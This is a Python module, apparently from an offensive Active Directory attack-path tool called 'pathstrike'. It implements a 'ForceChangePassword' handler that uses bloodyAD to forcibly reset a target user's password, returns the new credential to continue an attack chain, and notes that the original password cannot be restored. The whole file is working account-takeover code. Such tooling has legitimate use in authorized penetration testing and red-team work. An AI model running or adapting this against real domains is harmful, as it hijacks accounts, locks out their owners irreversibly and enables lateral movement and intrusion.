"""Password-related edge exploitation handlers."""

from __future__ import annotations

import secrets
import string

from pathstrike.engine.edge_registry import register_handler
from pathstrike.handlers.base import BaseEdgeHandler
from pathstrike.models import (
    Credential,
    CredentialType,
    EdgeInfo,
    RollbackAction,
)
from pathstrike.tools import bloodyad_wrapper as bloody


def _generate_password(length: int = 20) -> str:
    """Generate a cryptographically random password meeting AD complexity."""
    alphabet = string.ascii_letters + string.digits + "!@#$%&*"
    while True:
        password = "".join(secrets.choice(alphabet) for _ in range(length))
        # Ensure complexity: at least one upper, one lower, one digit, one special
        if (
            any(c.isupper() for c in password)
            and any(c.islower() for c in password)
            and any(c.isdigit() for c in password)
            and any(c in "!@#$%&*" for c in password)
        ):
            return password


@register_handler("ForceChangePassword")
class ForceChangePasswordHandler(BaseEdgeHandler):
    """Handles ForceChangePassword edges.

    Uses bloodyAD to force-reset the target user's password to a randomly
    generated value.  The new credential is returned so the engine can
    continue the attack chain.

    Rollback is not possible because the original password is unknown.
    """

    async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
        if edge.target.label.lower() != "user":
            return False, f"ForceChangePassword requires a User target, got {edge.target.label}"
        return True, f"Can force-change password for user {edge.target.name}"

    async def exploit(
        self, edge: EdgeInfo, dry_run: bool = False
    ) -> tuple[bool, str, list[Credential]]:
        principal = self._resolve_principal(edge)
        target = self._resolve_target(edge)
        auth_args = self._get_auth_args(principal)

        if dry_run:
            return (
                True,
                f"[DRY RUN] Would force password change on {target}",
                [],
            )

        new_password = _generate_password()
        self.logger.info("Force-changing password for %s", target)

        result = await bloody.set_password(self.config, auth_args, target, new_password)

        if not result["success"]:
            return (
                False,
                f"Password change failed for {target}: {result.get('error', 'unknown')}",
                [],
            )

        cred = Credential(
            cred_type=CredentialType.password,
            value=new_password,
            username=target,
            domain=self._get_domain(),
            obtained_from=f"ForceChangePassword on {target}",
        )

        self.logger.info("Password successfully changed for %s", target)
        return True, f"Password changed for {target}", [cred]

    def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
        # Original password is unknown; cannot be restored.
        return None
